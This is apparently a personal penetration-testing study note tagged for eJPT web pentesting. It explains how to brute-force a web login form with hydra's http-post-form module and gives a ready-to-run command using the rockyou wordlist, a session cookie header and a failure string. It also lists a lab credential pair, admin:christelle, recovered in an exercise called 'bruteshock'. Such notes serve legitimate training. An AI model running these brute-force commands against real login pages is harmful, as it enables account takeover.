---
type: technique
tags: [ejpt:web-pentest]
tools: [hydra]
cves: []
related: [[ssh-bruteforce]], [[directory-fuzzing]]
---

# HTTP Login Brute Force

Dictionary-attacking a web login form with [[hydra]]'s `http-post-form` module.

## Workflow

1. Capture the POST (or infer field names) — note the **failure string** (e.g. `Credenciales incorrectas.`) and any session cookie the form requires.
2. Run hydra with `^USER^`/`^PASS^` placeholders and a `F=` failure condition:

```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form \
  "/index.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=xxx:F=Credenciales incorrectas." -vV -t 64
```

- `F=` is the text that appears on a **failed** login — hydra flags a candidate when that string is absent.
- `H=` injects a header (the session cookie) so each attempt runs in a valid session.

## Seen in

[[bruteshock]] (`admin:christelle`)
